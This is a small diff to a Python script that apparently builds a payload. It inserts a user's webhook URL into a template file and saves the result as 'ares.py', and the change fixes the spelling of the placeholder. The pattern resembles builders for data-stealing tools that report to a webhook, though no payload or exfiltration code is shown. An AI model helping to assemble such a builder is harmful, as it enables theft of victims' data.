@@ -63,7 +63,7 @@ def main():
                 print(f"{Fore.RED}[!] {Fore.WHITE}Cannot read main.py")
                 return
             
-            mhk = content.replace('hk = "%WEBHOOk%"', f'hk = "{webhook}"')
+            mhk = content.replace('hk = "%WEBHOOK%"', f'hk = "{webhook}"')
             
             tf = "ares.py"
             with open(tf, "w", encoding='utf-8') as file:
